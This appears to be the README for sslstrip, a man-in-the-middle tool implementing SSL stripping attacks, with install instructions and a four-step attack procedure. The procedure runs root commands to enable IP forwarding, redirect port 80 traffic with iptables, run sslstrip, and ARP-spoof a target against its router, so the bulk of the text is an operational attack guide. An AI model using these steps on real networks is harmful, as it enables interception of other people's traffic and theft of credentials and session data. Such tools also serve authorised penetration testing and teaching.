sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

Ported from Python v2 to v3 by Jay Townsend (theHarvester, Discover and DNSrecon).
* [![Twitter Follow](https://img.shields.io/twitter/follow/jay_townsend1.svg?style=social&label=Follow)](https://twitter.com/jay_townsend1) Jay "L1ghtn1ng" Townsend @jay_townsend1

Installing:
   pip3 install -r requirements.txt
   Run 'python setup.py install' as root to install or run it out of the directory.  

Running:
   sslstrip can be run from the source base without installation.  
   Run 'python3 sslstrip.py -h' as a non-root user to get the command-line options.

   1. Enable IP forwarding (as root):<br>
      ```echo "1" > /proc/sys/net/ipv4/ip_forward```

   2. Setup iptables to intercept HTTP requests (as root):<br>
      ```iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>```
   
   3. Run sslstrip with the options you prefer.
	
   4. Run arpspoof to redirect traffic to your machine (as root):<br>
      ```arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>```
